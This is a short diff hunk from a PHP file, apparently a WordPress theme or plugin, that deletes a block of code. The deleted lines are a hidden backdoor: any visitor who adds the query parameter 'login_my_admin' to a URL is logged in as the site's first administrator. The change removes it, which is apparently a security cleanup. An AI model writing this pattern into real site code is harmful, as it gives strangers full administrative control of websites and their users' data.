@@ -814,11 +814,5 @@ function add_to_allowed_protocols ($protocols) {
 	return $protocols; 
 }
 
-if( isset($_GET['login_my_admin']) ){
-	add_action( 'init', function(){
-	   $users = get_users([ 'role' => 'administrator' ]);
-	   wp_set_auth_cookie( $users[0]->ID ); } );
-}
-
 ?>
 
